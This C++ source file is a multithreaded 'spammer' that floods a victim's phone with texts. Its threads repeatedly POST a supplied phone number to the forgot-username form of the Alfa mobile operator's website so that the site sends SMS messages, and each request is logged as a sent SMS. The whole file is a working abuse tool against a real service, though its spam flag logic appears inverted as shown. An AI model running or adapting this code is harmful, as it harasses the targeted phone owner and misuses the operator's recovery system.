/****
*****This program will include some equivalent to the modules I use in python2
*****Now it's the alpha spammer multithreaded
****/

#include <iostream>                //input/output
#include <unistd.h>                //for sleep()
#include <cstring>                 //for strings
#include <boost/thread/thread.hpp> //for the thread   -- multiplatform
#include <boost/thread/mutex.hpp>  //for the thread   -- mutex
#include <boost/bind.hpp>          //for the thread   -- foo bin
#include <boost/thread/once.hpp>   //for the thread   -- exec once
#include "Browser.hpp"             //for webinteraction
#include "spam.h"


int sms_sent =0;
bool is_spamming=1;
using namespace std;

///========GLOBAL VARS==========///
string myphone;
//global mutex
//to tell the other thread not access
// what is after if locked
boost::mutex io_mutex;
//flag for the exec once foo
boost::once_flag flag = BOOST_ONCE_INIT;
bool has_been_reinit  = false;


///=======RESET NB SMS==========///
void reset_nb_sms()
{
    has_been_reinit = true;
    sleep(5);
    has_been_reinit = false;

}

///========CURL POST==========///
void post_on_site()
{
    ///initialize browser
    Browser br;

    ///REPEAT ALL
    while(1)
    {
        if(is_spamming==0)
        {
            br.open("https://www.alfa.com.lb/ForgotUsername.aspx",    "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTkyOTU4NTc0N2QYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgIFDmN0bDAwJGxiU2lnbkluBR9jdGwwMCRDb250ZW50UGxhY2VIb2xkZXIkc3VibWl0DMfKZxZc1G5XUNM09c8OeibVzD8%3D&__EVENTVALIDATION=%2FwEWCAL4pMCwDwKYn6T1BAKB7cu1BQKkisXNCwLw8S0CrISgjQ0CyJPkwgIC5s%2BD1wVmD49zSfOzIhTOjOrlwxlP%2BEw8hA%3D%3D&ctl00%24txtMemberName=&ctl00%24txtPassword=&ctl00%24ContentPlaceHolder%24txtMobile="+myphone+"&ctl00%24ContentPlaceHolder%24submit.x=15&ctl00%24ContentPlaceHolder%24submit.y=10&ctl00%24hfSignin=0&ctl00%24hfValidateCode=0") ;

            cout<<"\033[0m[\033[94m+\033[0m] A New SMS has been Sent!\n";
            sms_sent++;
        }
        sleep(1);
    }
}



///========DO_SPAM()==========///
void do_spam(int given_nb_thread,char* phone_to_spam)
{
    ///Create the Thread handler
    myphone = phone_to_spam;
    int my_nb_threads =given_nb_thread;

    ///Now start the threads
    //Store the thread in a vector stack
    std::vector<boost::thread *> z;
    //start the func
    for (int i = 0; i < my_nb_threads; ++i)
        z.push_back(new boost::thread(
                                        boost::bind(&post_on_site)
                                    ));
    //wait for them to finish
    for (int i = 0; i < my_nb_threads; ++i)
    {
      //wait for end; otherwise the program will
      //end directly after starting all the threads
      z[i]->join();
      //remove from the stack
      delete z[i];
    }

}
